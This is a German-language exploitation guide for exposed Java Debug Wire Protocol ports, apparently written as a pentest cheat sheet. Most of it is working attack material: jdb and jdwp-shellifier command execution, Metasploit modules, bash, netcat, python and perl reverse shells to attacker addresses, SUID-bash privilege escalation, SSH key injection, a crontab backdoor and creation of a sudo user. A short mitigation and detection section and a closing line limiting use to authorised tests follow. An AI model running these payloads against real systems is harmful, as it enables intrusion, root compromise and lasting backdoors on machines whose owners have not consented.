# JDWP (Java Debug Wire Protocol) Exploitation Guide

## Übersicht

**Was:** Remote Code Execution über Java Debug Protocol
**Port:** Standardmäßig 8000 (kann variieren)
**Authentifizierung:** KEINE!
**Impact:** RCE als User des Java-Prozesses (oft root)

---

## Erkennung

### 1. Port Scanning
```bash
nmap -sV -p 8000 TARGET_IP
nmap -p- TARGET_IP | grep -i java
```

### 2. JDWP Handshake Test
```bash
printf "JDWP-Handshake" | nc TARGET_IP 8000
# Sollte zurückgeben: JDWP-Handshake
```

### 3. Process Enumeration (auf Target)
```bash
ps aux | grep -i "xdebug\|jdwp\|dt_socket"
netstat -tulpn | grep 8000
ss -tulpn | grep 8000
```

**Verwundbare Flags:**
```
-Xdebug
-Xrunjdwp:transport=dt_socket,address=8000,server=y
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000
```

---

## Exploitation Methoden

### Methode 1: jdb (Java Debugger) ⭐ BESTE für Linux

**Voraussetzung:** jdb muss installiert sein

#### Schritt 1: Verbinden & Breakpoint setzen
```bash
jdb -attach TARGET_IP:8000
```

**In jdb:**
```java
stop in java.net.ServerSocket.accept
stop in java.lang.String.indexOf
stop in java.io.PrintStream.println
stop in java.lang.Object.toString
resume
```

#### Schritt 2: App triggern (Breakpoint treffen)

**Beispiele je nach App:**
```bash
# HTTP Service
curl http://TARGET_IP:PORT/

# TCP Service
nc TARGET_IP PORT

# Specific endpoint
wget http://TARGET_IP:8080/stats
```

#### Schritt 3: Am Breakpoint - Code ausführen

**Prompt ändert sich zu:** `main[1]` oder `thread[1]`

**SUID Bash erstellen:**
```java
print java.lang.Runtime.getRuntime().exec("cp /bin/bash /tmp/rootbash")
print java.lang.Runtime.getRuntime().exec("chmod 4755 /tmp/rootbash")
cont
quit
```

**Root werden:**
```bash
/tmp/rootbash -p
whoami
```

**Oder direkt Reverse Shell:**
```java
print java.lang.Runtime.getRuntime().exec("bash -c bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
cont
quit
```

#### Wichtige jdb Regeln:

1. ✅ Nur am Breakpoint (`main[1]` Prompt) funktioniert Code Execution
2. ✅ JEDES MAL neu triggern um Breakpoint zu treffen
3. ❌ Array-Syntax `new String[]{}` funktioniert NICHT in jdb
4. ✅ Nutze separate Befehle oder String mit Shell
5. ❌ `command1 && command2` funktioniert NICHT (kein Shell)
6. ✅ Nutze `bash -c "command1 && command2"` für mehrere Befehle

---

### Methode 2: jdwp-shellifier ⭐ BESTE für Automation

```bash
# Tool downloaden
wget https://raw.githubusercontent.com/IOActive/jdwp-shellifier/master/jdwp-shellifier.py
chmod +x jdwp-shellifier.py

# SUID Bash
python jdwp-shellifier.py -t TARGET_IP -p 8000 --cmd "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"

# Reverse Shell
python jdwp-shellifier.py -t TARGET_IP -p 8000 --cmd "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Direkte Shell
python jdwp-shellifier.py -t TARGET_IP -p 8000 --break-on 'java.lang.String.indexOf'
```

**Listener:**
```bash
nc -lvnp 4444
```

---

### Methode 3: Metasploit

```bash
msfconsole -q
use exploit/multi/misc/java_jdwp_debugger
set RHOST TARGET_IP
set RPORT 8000
show payloads

# Option 1: Generic Shell
set PAYLOAD generic/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit

# Option 2: Java Meterpreter
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

---

### Methode 4: Manual JDWP Protocol

```python
#!/usr/bin/env python3
import socket

def jdwp_handshake(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(b"JDWP-Handshake")
    response = sock.recv(14)
    print(f"[+] Handshake: {response}")
    return sock

# Usage
sock = jdwp_handshake('192.168.1.100', 8000)
```

---

## Häufige Szenarien

### Szenario 1: HTTP/Web Service auf Port 8080

```bash
# Terminal 1
jdb -attach localhost:8000
stop in java.net.ServerSocket.accept
resume

# Terminal 2
curl http://localhost:8080/

# Terminal 1 (nach Breakpoint)
print java.lang.Runtime.getRuntime().exec("chmod 4755 /bin/bash")
cont
quit

# Terminal 3
/bin/bash -p
```

### Szenario 2: Custom TCP Service

```bash
# Finde heraus auf welchem Port die App läuft
netstat -tulpn | grep java

# z.B. Port 5000
nc localhost 5000  # Triggert den Service
```

### Szenario 3: Kein direkter Trigger möglich

```bash
# Nutze allgemeinere Breakpoints
stop in java.lang.Object.toString
stop in java.lang.String.length

# Warte auf normale App-Aktivität
```

---

## Payload Varianten

### SUID Bash (Persistent)
```java
print java.lang.Runtime.getRuntime().exec("cp /bin/bash /tmp/.hidden")
print java.lang.Runtime.getRuntime().exec("chmod 4755 /tmp/.hidden")
```

### Reverse Shells

**Bash:**
```java
print java.lang.Runtime.getRuntime().exec("bash -c bash -i >& /dev/tcp/10.10.14.5/4444 0>&1")
```

**Netcat:**
```java
print java.lang.Runtime.getRuntime().exec("nc 10.10.14.5 4444 -e /bin/bash")
```

**Python:**
```java
print java.lang.Runtime.getRuntime().exec("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'")
```

**Perl:**
```java
print java.lang.Runtime.getRuntime().exec("perl -e 'use Socket;$i=\"10.10.14.5\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'")
```

### SSH Key Injection
```java
print java.lang.Runtime.getRuntime().exec("mkdir -p /root/.ssh")
print java.lang.Runtime.getRuntime().exec("echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys")
print java.lang.Runtime.getRuntime().exec("chmod 600 /root/.ssh/authorized_keys")
```

### Cron Job Backdoor
```java
print java.lang.Runtime.getRuntime().exec("echo '* * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /etc/crontab")
```

### User Creation
```java
print java.lang.Runtime.getRuntime().exec("useradd -m -s /bin/bash pwned")
print java.lang.Runtime.getRuntime().exec("echo 'pwned:password123' | chpasswd")
print java.lang.Runtime.getRuntime().exec("usermod -aG sudo pwned")
```

---

## Troubleshooting

### Problem: "Name unknown: java.lang.Runtime.getRuntime"

**Ursache:** Kein Execution Context (kein Breakpoint getroffen)

**Lösung:**
1. Breakpoint setzen: `stop in java.lang.String.indexOf`
2. App triggern
3. Warten auf `main[1]` Prompt
4. DANN Code ausführen

---

### Problem: exec() gibt "null" zurück

**Ursache:** Kein aktiver Thread / nicht am Breakpoint

**Lösung:**
- Prüfe Prompt: Muss `main[1]` oder `thread[1]` sein, nicht `>`
- Neu triggern

---

### Problem: Command funktioniert nicht mit &&

**Ursache:** `exec()` startet keine Shell, `&&` wird nicht interpretiert

**Lösung:**
```java
# Falsch:
print java.lang.Runtime.getRuntime().exec("cmd1 && cmd2")

# Richtig - Option 1:
print java.lang.Runtime.getRuntime().exec("bash -c cmd1 && cmd2")

# Richtig - Option 2:
print java.lang.Runtime.getRuntime().exec("cmd1")
print java.lang.Runtime.getRuntime().exec("cmd2")
```

---

### Problem: Array Syntax funktioniert nicht in jdb

**Ursache:** jdb unterstützt keine inline Arrays

**Lösung:**
```java
# Falsch:
print java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","command"})

# Richtig:
print java.lang.Runtime.getRuntime().exec("bash -c command")
```

---

### Problem: Port 8000 nicht von außen erreichbar

**Check:**
```bash
netstat -tulpn | grep 8000
```

**Wenn `127.0.0.1:8000`:** Nur localhost binding

**Lösungen:**
1. SSH Tunnel:
```bash
ssh -L 8000:localhost:8000 user@TARGET_IP
# Dann lokal verbinden:
jdb -attach localhost:8000
```

2. Port Forward mit Chisel/Socat

3. Exploit von lokaler Shell auf Target

---

## Defense & Detection

### Mitigation

1. **JDWP deaktivieren in Production:**
```bash
# Entferne diese Flags aus Java-Parametern:
-Xdebug
-Xrunjdwp
-agentlib:jdwp
```

2. **Localhost-only Binding:**
```bash
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8000
```

3. **Firewall:**
```bash
iptables -A INPUT -p tcp --dport 8000 -j DROP
iptables -A INPUT -p tcp --dport 8000 -s 127.0.0.1 -j ACCEPT
```

### Detection

**Network:**
```bash
# Wireshark Filter
tcp.port == 8000 and tcp.payload contains "JDWP-Handshake"

# Suricata Rule
alert tcp any any -> any 8000 (msg:"JDWP Connection Attempt"; content:"JDWP-Handshake"; sid:1000001;)
```

**Host-based:**
```bash
# Prüfe laufende Java-Prozesse
ps aux | grep -E "xdebug|jdwp|dt_socket"

# Port-Monitoring
lsof -i :8000
netstat -tulpn | grep 8000
```

**Logs:**
```bash
# Auth Logs für verdächtige Aktivität
grep -i jdwp /var/log/auth.log
journalctl | grep -i jdwp
```

---

## Tools & Resources

**Tools:**
- [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
- [jdwp-codeifier](https://github.com/Kabot/jdwp-codeifier)
- Metasploit: `exploit/multi/misc/java_jdwp_debugger`
- jdb (included in JDK)

**Reading:**
- [Java Platform Debugger Architecture](https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/)
- [JDWP Protocol Specification](https://docs.oracle.com/javase/8/docs/platform/jpda/jdwp/jdwp-protocol.html)

---

## Quick Reference

```bash
# Detection
nmap -p 8000 TARGET_IP
printf "JDWP-Handshake" | nc TARGET_IP 8000

# Exploitation (jdb)
jdb -attach TARGET_IP:8000
stop in java.lang.String.indexOf
resume
# [Trigger app]
# [At breakpoint:]
print java.lang.Runtime.getRuntime().exec("chmod 4755 /bin/bash")
cont
quit
# [On target:]
/bin/bash -p

# Exploitation (jdwp-shellifier)
python jdwp-shellifier.py -t TARGET_IP -p 8000 --cmd "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# Listener
nc -lvnp 4444
```

---

**Nur für autorisierte Penetration Tests verwenden!**
